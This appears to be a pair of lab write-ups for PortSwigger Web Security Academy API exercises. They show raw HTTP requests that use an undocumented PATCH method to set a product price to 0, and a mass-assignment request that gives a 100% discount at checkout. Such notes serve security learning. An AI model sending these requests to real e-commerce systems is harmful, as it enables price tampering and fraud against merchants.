# API Testing

## Finding and exploiting an unused API endpoint

The `price` endpoint not only allows the `GET` method but also `PATCH`.

```
PATCH /api/products/1/price HTTP/2
Host: 0ad10068036333308060530f007800d6.web-security-academy.net
Cookie: session=f1t8Tfqc7LY7RwwMuWYwYG5mA2CxkpFc
[...]
Content-Type: application/json;charset=UTF-8
Content-Length: 12

{"price": 0}
```

## Exploiting a mass assignment vulnerability

It is possible to send a `POST` request to the `checkout` endpoint with 100% 
discount.

```
POST /api/checkout HTTP/2
Host: 0af0002804d0d47e86ff4f3200e200aa.web-security-academy.net
Cookie: session=42Y5LbakIMHg3C8i7egh1Kt9P1E6UWD9
Content-Type: application/json;charset=UTF-8
[...]

{"chosen_discount":{"percentage": 100},"chosen_products":[{"product_id":"1","name":"Lightweight \"l33t\" Leather Jacket","quantity":1,"item_price":133700}]}
```

